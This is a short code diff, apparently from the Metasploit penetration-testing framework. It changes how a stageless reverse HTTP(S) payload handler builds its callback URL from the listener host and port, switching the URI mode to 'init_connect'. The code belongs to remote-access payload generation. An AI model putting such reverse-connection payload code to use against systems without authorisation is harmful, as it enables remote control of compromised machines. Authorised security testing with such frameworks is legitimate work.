@@ -38,7 +38,10 @@ module Handler::ReverseHttp::Stageless
     host = datastore['LHOST']
     host = "[#{host}]" if Rex::Socket.is_ipv6?(host)
     url = "http#{opts[:ssl] ? "s" : ""}://#{host}:#{datastore['LPORT']}"
-    url << "#{generate_uri_uuid_mode(:connect)}/"
+
+    # Use the init_connect mode because we're stageless. This will force
+    # MSF to generate a new URI when the first request is made.
+    url << "#{generate_uri_uuid_mode(:init_connect)}/"
 
     # invoke the given function to generate the architecture specific payload
     opts[:generator].call(url) do |dll|
